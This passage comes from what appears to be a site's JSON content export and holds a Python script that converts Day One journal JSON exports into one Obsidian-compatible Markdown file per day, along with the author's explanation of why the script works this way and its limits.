= entryText.replace(&quot;\\\\[\\\\]&quot;, &quot;[]&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\\\\\&quot;, &quot;\\\\&quot;)\n\t\tentryText = entryText.replace(&quot;[ *&quot;, &quot;[*&quot;)\n\t\tentryText = entryText.replace(&quot;* ]&quot;, &quot;*]&quot;)\n\t\tentryText = entryText.replace(&quot;#&quot;, &quot;⌗&quot;)\n\t\tentryText = entryText.replace(&quot;$&quot;, &quot;＄&quot;)\n\t\tentryText = entryText.replace(&quot; --- &quot;, &quot; — &quot;)\n\t\tentryText = entryText.replace(&quot; -- &quot;, &quot; – &quot;)\n\t\tentryText = entryText.replace(&quot;...&quot;, &quot;…&quot;)\n\t\tentryText = entryText.strip()\n \n\t\tif entryDate not in journalData:\n\t\t\tjournalData[entryDate] = {}\n \n\t\tjournalData[entryDate][entryIndex] = {}\n \n\t\tjournalData[entryDate][entryIndex][&quot;header&quot;] = entryHeader\n\t\tjournalData[entryDate][entryIndex][&quot;uuid&quot;] = entryUuid\n\t\tjournalData[entryDate][entryIndex][&quot;datetime&quot;] = entryDateTime\n\t\tjournalData[entryDate][entryIndex][&quot;tags&quot;] = entryTags\n\t\tif len(entryLocation) &gt; 0:\n\t\t\tjournalData[entryDate][entryIndex][&quot;location&quot;] = entryLocation\n\t\tif len(entryWeather) &gt; 0:\n\t\t\tjournalData[entryDate][entryIndex][&quot;weather&quot;] = entryWeather\n\t\tjournalData[entryDate][entryIndex][&quot;text&quot;] = entryText\n \njournalData = dict(sorted(journalData.items()))\n \nfor journalDate, journalEntries in journalData.items():\n\tjournalData[journalDate] = dict(sorted(journalEntries.items()))\n \nfor journalDate, journalEntries in journalData.items():\n\tjournalDateTime = datetime.strptime(journalDate, &quot;%Y-%m-%d&quot;)\n \n\tjournalDayNumber = journalDateTime.strftime(&quot;%-d&quot;)\n \n\tjournalDaySuffix = &quot;th&quot;\n\tif (journalDayNumber == &quot;1&quot;) or (journalDayNumber == &quot;21&quot;) or (journalDayNumber == &quot;31&quot;):\n\t\tjournalDaySuffix = &quot;st&quot;\n\telif (journalDayNumber == &quot;2&quot;) or (journalDayNumber == &quot;22&quot;):\n\t\tjournalDaySuffix = &quot;nd&quot;\n\telif (journalDayNumber == &quot;3&quot;) or (journalDayNumber == &quot;23&quot;):\n\t\tjournalDaySuffix = &quot;rd&quot;\n \n\tjournalDayName = journalDateTime.strftime(&quot;%A&quot;)\n\tjournalHumanDate = journalDateTime.strftime(&quot;%B&quot;) + &quot; &quot; + journalDayNumber + journalDaySuffix + &quot; &quot; + journalDateTime.strftime(&quot;%Y&quot;)\n\tjournalAmericanDate = journalDateTime.strftime(&quot;%-m/%-d/%Y&quot;)\n \n\tjournalFileName = journalDate + &quot; &quot; + journalDayName + &quot;.md&quot;\n \n\twith open (journalFileName, &quot;w&quot;) as journalFile:\n\t\tprint(&quot;---&quot;, file = journalFile)\n\t\tprint(&quot;title: Journal for &quot; + journalDayName + &quot;, &quot; + journalHumanDate, file = journalFile)\n\t\tprint(&quot;date: &quot; + journalDate, file = journalFile)\n\t\tprint(&quot;tags:&quot;, file = journalFile)\n\t\tprint(&quot;  - Journal&quot;, file = journalFile)\n\t\tprint(&quot;aliases:&quot;, file = journalFile)\n\t\tprint(&quot;  - Journal for &quot; + journalDayName + &quot;, &quot; + journalHumanDate, file = journalFile)\n\t\tprint(&quot;  - &quot; + journalDayName + &quot;, &quot; + journalHumanDate, file = journalFile)\n\t\tprint(&quot;  - &quot; + journalHumanDate, file = journalFile)\n\t\tprint(&quot;  - &quot; + journalDate, file = journalFile)\n\t\tprint(&quot;  - &quot; + journalAmericanDate, file = journalFile)\n\t\tprint(&quot;locations:&quot;, file = journalFile)\n\t\tprint(&quot;---&quot;, file = journalFile)\n \n\t\tfor entryId, entry in journalEntries.items():\n \n\t\t\tprint(entry[&quot;header&quot;], file = journalFile)\n\t\t\tprint(&quot;[dayOneId:: &quot; + entry[&quot;uuid&quot;] + &quot;]&quot;, file = journalFile)\n\t\t\tprint(&quot;[datetime:: &quot; + entry[&quot;datetime&quot;] + &quot;]&quot;, file = journalFile)\n\t\t\tprint(&quot;[tags:: &quot; + entry[&quot;tags&quot;] + &quot;]&quot;, file = journalFile)\n\t\t\tif &quot;location&quot; in entry:\n\t\t\t\tprint(&quot;[location:: &quot; + entry[&quot;location&quot;] + &quot;]&quot;, file = journalFile)\n\t\t\tif &quot;weather&quot; in entry:\n\t\t\t\tprint(&quot;[weather:: &quot; + entry[&quot;weather&quot;] + &quot;]&quot;, file = journalFile)\n\t\t\tprint(&quot;&quot;, file = journalFile)\n\t\t\tprint(entry[&quot;text&quot;], file = journalFile)\n\t\t\tprint(&quot;&quot;, file = journalFile)","richContent":"&lt;p&gt;The below script, when run in a directory of &lt;a href=&quot;https://dayoneapp.com/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Day One&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; JSON exports. The result is an opinionated output of &lt;a href=&quot;https://obsidian.md&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Obsidian&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;-compatible &lt;a href=&quot;https://help.obsidian.md/Editing+and+formatting/Obsidian+Flavored+Markdown&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Markdown files&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. The big difference between this script and similar implementations (like &lt;a href=&quot;https://github.com/kulapard/dayone-to-obsidian/tree/main&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;&lt;code&gt;dayone-to-obsidian&lt;/code&gt;&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;) is that only &lt;em&gt;one&lt;/em&gt; Markdown file is generated per day, with Day one entries arranged chronologically within it. This approach is &lt;em&gt;much&lt;/em&gt; more compatible with the current Obsidian daily note plugin ecosystem, (almost) all of which assume only a single note per day.&lt;/p&gt;\n&lt;p&gt;This is also a pretty simple implementation. So while it’s output is opinionated, it should also be pretty easy to adapt this script to different use cases.&lt;/p&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Day One has a tendency to add extra spaces, or add/remove additional line breaks, in a somewhat random fashion. This script tries to correct for some of the more common issues, but it doesn’t correct for all of them. It will be necessary to do a hand-editing pass over the generated Markdown files in order to catch any remaining formatting issues.&lt;/p&gt;\n&lt;p&gt;The only way around this is probably to directly parse the JSON representation of each journal entry, but that would make for a much more complicated script, and it’s not clear that the extra effort it would take to write such a parser would be less than the effort required just to manually review the output files.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;python&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; os&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; json&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; datetime &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; datetime&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; zoneinfo &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; ZoneInfo&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Read in all JSON files in the directory&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;rawDayOneData &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; os&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;listdir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\tif&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;endswith&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.json&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;):&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\twith&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; open&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; as&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; jsonData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\t\trawDayOneData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;file&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;replace&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.json&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; json&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;load&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;jsonData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create master document list&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;journalData &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; {}&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; journalName&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; rawJournalData &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; rawDayOneData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;items&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;():&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\tfor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entry &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; rawJournalData&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;entries&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryDateTimeObject &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; datetime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;fromisoformat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;creationDate&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;])&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryDate &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryDateTimeObject&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;astimezone&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ZoneInfo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;timeZone&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;])).&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%Y-%m-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;%d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryTime &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryDateTimeObject&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;astimezone&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ZoneInfo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;timeZone&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;])).&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%H:%M&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\t\tentryDateTime &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; entryDateTimeObject&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;astimezone&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ZoneInfo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;entry&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;timeZone&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;])).&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;strftime&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;%Y-%m-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;%d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;T%H:%M:%S&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span 